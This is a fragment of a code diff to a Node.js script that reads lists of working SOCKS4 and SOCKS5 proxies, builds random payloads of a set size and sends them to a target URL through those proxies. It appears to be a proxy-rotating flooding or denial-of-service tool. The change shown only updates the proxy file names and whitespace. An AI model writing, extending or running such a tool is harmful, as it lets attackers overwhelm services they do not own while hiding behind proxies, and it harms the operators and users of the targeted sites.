@@ -2,8 +2,8 @@ const http = require('http');
 const fs = require('fs');
 const { SocksClient } = require('socks');
 
-const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);
-const socks5Proxies = fs.readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);
+const socks4Proxies = fs.readFileSync('working-socks4.txt', 'utf8').split('\n').filter(Boolean);
+const socks5Proxies = fs.readFileSync('working-socks5.txt', 'utf8').split('\n').filter(Boolean);
 
 function generatePayload(kbSize) {
     const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
@@ -24,7 +24,7 @@ async function sendPacket(targetUrl, proxy, delay, kbSize) {
             proxy: {
                 ipaddress: proxyIp,
                 port: parseInt(proxyPort),
-                type: socks4Proxies.includes(proxy) ? 4 : 5, 
+                type: socks4Proxies.includes(proxy) ? 4 : 5,
             },
             destination: {
                 host: target.hostname,
